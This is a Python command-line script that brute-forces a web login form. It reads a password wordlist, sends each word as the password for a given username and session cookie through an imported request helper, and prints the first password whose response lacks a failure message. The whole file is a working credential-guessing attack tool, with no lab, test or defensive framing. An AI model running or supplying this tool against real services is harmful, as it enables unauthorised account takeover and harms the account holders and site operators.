from RequestPayloader import HTTPRequestHandler
import sys

def load_wordlist(filepath):
    # Initialize an empty list to store words
    wordlist = []
    # Open the file at the given filepath in read mode
    with open(filepath, "r") as file:
        # Read all lines from the file and store them in wordlist
        wordlist = file.readlines()

    # Return the list of words, stripping newline characters from each word
    return [word.strip() for word in wordlist]  # removing \n from the end of each entry

def check_pass(response, fail_msg):
    # Check if the fail message is in the response
    if fail_msg in response:
        return False  # If fail message is found, return False
    return True  # Otherwise, return True

def main():
    if sys.argv.__len__() < 6:
        # Print error message and usage instruction
        print("Error, not all sufficient arguments were passed.")
        print(f"usage: python {sys.argv[0]} URL USERNAME WORDLIST FAIL_MSG COOKIE")
        exit(-1)
    
    # Assign command line arguments to variables
    url = sys.argv[1]
    username = sys.argv[2]
    pass_wordlist = sys.argv[3]
    fail_msg = sys.argv[4]
    cookie = sys.argv[5]
    
    # Initialize HTTPRequestHandler with the URL and cookie
    handler = HTTPRequestHandler(url, cookie)
    # Update the base URL with the given username
    handler.base_url = handler.manipulate_url(param="username", new_value=username)
    # Load the wordlist from the given filepath
    wordlist = load_wordlist(pass_wordlist)

    # Iterate through each word in the wordlist
    for word in wordlist:
        # Send an HTTP request with the current word as the password
        response = handler.send_request(param="password", new_value=word)
        # Check if the response indicates a successful login
        if check_pass(response.text, fail_msg):
            # Print the found password and exit the program
            print(f"Found password! password is: {word}")
            exit(0)
    
    # If no password was found, print a message
    print("No password found!")
    
if __name__ == "__main__":
    # Run the main function if the script is executed directly
    main()
    exit(0)

